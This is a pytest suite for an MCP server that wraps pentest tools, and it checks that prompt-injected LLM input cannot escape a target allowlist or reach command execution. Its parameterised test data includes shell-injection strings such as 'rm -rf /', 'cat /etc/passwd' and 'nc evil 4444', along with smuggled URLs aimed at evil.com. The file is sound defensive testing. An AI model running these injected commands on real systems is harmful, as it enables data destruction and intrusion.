"""Tests for the API-RedBox-MCP allowlist / no-passthrough invariants.

The reason this project exists is that a hallucinating or prompt-injected LLM
must not be able to reach arbitrary command execution, and must not be able to
point the tools at hosts outside the engagement. These tests assert the layers
that guarantee it:

  1. Schema layer  — FastMCP/pydantic rejects out-of-allowlist values (enum,
     regex pattern) *before* our code runs. Exercised via ``mcp.call_tool``,
     the same entrypoint the MCP transport uses.
  2. Handler layer — the ``_validate_*`` helpers reject non-IP / non-URL inputs
     and any target not on the hardcoded ``ALLOWED_TARGETS`` list, and each tool
     routes through ``run_binary`` with an exact argv list, so shell
     metacharacters are inert and nothing is concatenated into a command string.

Real binaries are never executed: ``run_binary`` is always patched.
"""

from __future__ import annotations

import asyncio
from unittest.mock import patch

import pytest
from mcp.server.fastmcp.exceptions import ToolError

import server

ALLOWED = "192.168.68.100"  # the one hardcoded target (server.ALLOWED_TARGETS)
NOT_ALLOWED = "8.8.8.8"  # a perfectly valid IP that must still be refused


def call_tool(name: str, arguments: dict):
    """Drive the async framework entrypoint (schema validation + dispatch) synchronously."""
    return asyncio.run(server.mcp.call_tool(name, arguments))


# ---------------------------------------------------------------------------
# Sanity: the seeded allowlist is what the tests assume
# ---------------------------------------------------------------------------


def test_allowlist_is_seeded_with_the_single_target():
    assert ALLOWED in server.ALLOWED_TARGETS


# ---------------------------------------------------------------------------
# Handler layer — validators
# ---------------------------------------------------------------------------


class TestValidateTargetIp:
    def test_accepts_allowlisted_ip(self):
        assert server._validate_target_ip(ALLOWED) == ALLOWED

    @pytest.mark.parametrize(
        "value",
        [
            "8.8.8.8",  # public IP — the whole point is to refuse this
            "10.0.0.5",
            "127.0.0.1",
            "::1",
            "192.168.68.101",  # adjacent host, still not on the list
            "192.168.69.100",  # adjacent subnet
        ],
    )
    def test_rejects_valid_ip_not_on_allowlist(self, value):
        with pytest.raises(ValueError):
            server._validate_target_ip(value)

    @pytest.mark.parametrize(
        "value",
        [
            "example.com",  # hostnames are not allowed — only literal IPs
            "api.target.com",
            "localhost",
            "192.168.68.100; rm -rf /",  # shell metacharacters
            "192.168.68.100 && cat /etc/passwd",
            "$(whoami)",
            "192.168.68.100|nc evil 4444",
            "192.168.68.100 -oN /tmp/out",  # smuggled extra nmap flag
            "999.999.999.999",
            "",
        ],
    )
    def test_rejects_non_ip(self, value):
        with pytest.raises(ValueError):
            server._validate_target_ip(value)


class TestValidateHttpUrl:
    @pytest.mark.parametrize(
        "value",
        [
            "http://192.168.68.100",
            "https://192.168.68.100/v1",
            "http://192.168.68.100/FUZZ",
            "http://192.168.68.100:8080/api",
        ],
    )
    def test_accepts_allowlisted_http_urls(self, value):
        assert server._validate_http_url(value) == value

    @pytest.mark.parametrize(
        "value",
        [
            "ftp://192.168.68.100/file",
            "file:///etc/passwd",
            "javascript:alert(1)",
            "ssh://192.168.68.100",
            "gopher://192.168.68.100/_",
            "evil.com",
            "//192.168.68.100",
            "",
            " http://192.168.68.100",  # leading space defeats the scheme check
        ],
    )
    def test_rejects_non_http(self, value):
        with pytest.raises(ValueError):
            server._validate_http_url(value)

    @pytest.mark.parametrize(
        "value",
        [
            "http://8.8.8.8/",
            "https://10.0.0.5/api",
            "http://192.168.68.101/",
        ],
    )
    def test_rejects_url_host_not_on_allowlist(self, value):
        with pytest.raises(ValueError):
            server._validate_http_url(value)

    @pytest.mark.parametrize(
        "value",
        [
            "https://api.target.com",  # a hostname is never resolved
            "http://localhost/",
            "http://192.168.68.100.evil.com/",  # not the IP — a lookalike host
            "http://192.168.68.100@evil.com/",  # userinfo smuggling; real host is evil.com
        ],
    )
    def test_rejects_hostname_and_smuggled_hosts(self, value):
        with pytest.raises(ValueError):
            server._validate_http_url(value)


class TestWordlistResolution:
    def test_all_aliases_resolve_under_wordlist_dir(self):
        prefix = str(server.WORDLIST_DIR) + "/"
        for alias in server.WORDLISTS:
            assert server._resolve_wordlist(alias).startswith(prefix)

    def test_wordlist_values_contain_no_path_traversal(self):
        for filename in server.WORDLISTS.values():
            assert "/" not in filename
            assert ".." not in filename

    def test_unknown_alias_raises(self):
        # A caller-supplied path can never be turned into a wordlist; only aliases.
        with pytest.raises(KeyError):
            server._resolve_wordlist("../../etc/passwd")


# ---------------------------------------------------------------------------
# Handler layer — each tool builds an exact argv list (no command string)
# ---------------------------------------------------------------------------


class TestToolArgvConstruction:
    def test_nmap_builds_expected_argv(self):
        with patch.object(server, "run_binary", return_value="OK") as rb:
            assert server.nmap_scan(ALLOWED) == "OK"
        rb.assert_called_once_with(["nmap", "-Pn", "-sT", "-p", "1-1000", ALLOWED])

    def test_nmap_version_detection_is_additive_over_connect_scan(self):
        # -sV must never replace -sT: a bare -sV lets nmap fall back to a SYN
        # scan that needs a raw socket the cap-dropped sandbox denies.
        with patch.object(server, "run_binary", return_value="OK") as rb:
            server.nmap_scan(ALLOWED, ports="80,443", scan_type="-sV")
        rb.assert_called_once_with(
            ["nmap", "-Pn", "-sT", "-sV", "-p", "80,443", ALLOWED]
        )

    def test_nmap_rejects_hostname_before_exec(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.nmap_scan("api.target.com")
        rb.assert_not_called()

    def test_nmap_rejects_target_not_on_allowlist_before_exec(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.nmap_scan(NOT_ALLOWED)
        rb.assert_not_called()

    def test_ffuf_builds_expected_argv(self):
        with patch.object(server, "run_binary", return_value="OK") as rb:
            server.ffuf_discover("http://192.168.68.100/FUZZ", wordlist="common")
        rb.assert_called_once_with(
            [
                "ffuf",
                "-u",
                "http://192.168.68.100/FUZZ",
                "-w",
                server._resolve_wordlist("common"),
                "-noninteractive",
            ]
        )

    def test_ffuf_requires_fuzz_keyword(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.ffuf_discover("http://192.168.68.100/")
        rb.assert_not_called()

    def test_ffuf_rejects_non_http(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.ffuf_discover("file:///etc/passwd?FUZZ")
        rb.assert_not_called()

    def test_arjun_builds_expected_argv(self):
        with patch.object(server, "run_binary", return_value="OK") as rb:
            server.arjun_params("http://192.168.68.100/api", method="POST")
        rb.assert_called_once_with(
            ["arjun", "-u", "http://192.168.68.100/api", "-m", "POST"]
        )

    def test_arjun_rejects_non_http(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.arjun_params("ftp://192.168.68.100")
        rb.assert_not_called()

    def test_url_host_not_on_allowlist_rejected_before_exec(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.arjun_params("http://8.8.8.8/api")
        rb.assert_not_called()

    def test_nuclei_builds_expected_argv(self):
        with patch.object(server, "run_binary", return_value="OK") as rb:
            server.nuclei_scan("https://192.168.68.100/api")
        rb.assert_called_once_with(
            [
                "nuclei",
                "-u",
                "https://192.168.68.100/api",
                "-tags",
                "rest,api",
                "-templates",
                server.NUCLEI_TEMPLATE_DIR,
                "-disable-update-check",
            ]
        )

    def test_nuclei_rejects_non_http(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.nuclei_scan("evil.com")
        rb.assert_not_called()

    def test_shell_metacharacters_in_url_stay_a_single_argv_token(self):
        # A URL passes scheme + allowlist validation but may still contain
        # metacharacters. Defense in depth: it reaches the binary as ONE argv
        # element, so with shell=False the metacharacters are inert and nothing
        # leaks into separate flags.
        nasty = "http://192.168.68.100/$(rm -rf /);id|nc evil 4444"
        with patch.object(server, "run_binary", return_value="OK") as rb:
            server.arjun_params(nasty)
        argv = rb.call_args.args[0]
        assert argv == ["arjun", "-u", nasty, "-m", "GET"]


# ---------------------------------------------------------------------------
# Schema layer — the framework rejects out-of-allowlist values before dispatch
# ---------------------------------------------------------------------------


class TestSchemaLayerRejectsOutOfAllowlist:
    def test_nmap_rejects_scan_type_outside_enum(self):
        with patch.object(server, "run_binary", return_value="OK"):
            with pytest.raises(ToolError):
                call_tool("nmap_scan", {"target": ALLOWED, "scan_type": "-O"})

    def test_nmap_rejects_ports_with_shell_metacharacters(self):
        with patch.object(server, "run_binary", return_value="OK"):
            with pytest.raises(ToolError):
                call_tool("nmap_scan", {"target": ALLOWED, "ports": "1; rm -rf /"})

    def test_nmap_rejects_overlong_ports(self):
        with patch.object(server, "run_binary", return_value="OK"):
            with pytest.raises(ToolError):
                call_tool("nmap_scan", {"target": ALLOWED, "ports": "1," * 40})

    def test_ffuf_rejects_arbitrary_wordlist_path(self):
        with patch.object(server, "run_binary", return_value="OK"):
            with pytest.raises(ToolError):
                call_tool(
                    "ffuf_discover",
                    {"url": "http://192.168.68.100/FUZZ", "wordlist": "/etc/passwd"},
                )

    def test_arjun_rejects_method_outside_enum(self):
        with patch.object(server, "run_binary", return_value="OK"):
            with pytest.raises(ToolError):
                call_tool(
                    "arjun_params", {"url": "http://192.168.68.100", "method": "DELETE"}
                )

    def test_valid_call_through_framework_succeeds(self):
        with patch.object(server, "run_binary", return_value="SCAN-RESULT") as rb:
            _content, structured = call_tool("nmap_scan", {"target": ALLOWED})
        assert structured == {"result": "SCAN-RESULT"}
        rb.assert_called_once()


# ---------------------------------------------------------------------------
# Target allowlist enforced through the framework (handler ValueError -> ToolError)
# ---------------------------------------------------------------------------


class TestTargetAllowlistThroughFramework:
    def test_nmap_target_not_on_allowlist_rejected(self):
        with patch.object(server, "run_binary", return_value="OK"):
            with pytest.raises(ToolError):
                call_tool("nmap_scan", {"target": NOT_ALLOWED})

    def test_url_tool_host_not_on_allowlist_rejected(self):
        with patch.object(server, "run_binary", return_value="OK"):
            with pytest.raises(ToolError):
                call_tool("nuclei_scan", {"url": "http://8.8.8.8/api"})


# ---------------------------------------------------------------------------
# The hard invariant (SPECS.md §3): no tool exposes a free-form passthrough field
# ---------------------------------------------------------------------------


def test_no_tool_exposes_a_freeform_command_field():
    banned = {
        "command",
        "cmd",
        "args",
        "argv",
        "extra_args",
        "additional_flags",
        "additionalflags",
        "flags",
        "options",
        "shell",
        "exec",
        "raw",
    }
    for tool in asyncio.run(server.mcp.list_tools()):
        props = {k.lower() for k in tool.inputSchema.get("properties", {})}
        leaked = props & banned
        assert not leaked, f"{tool.name} exposes banned passthrough field(s): {leaked}"
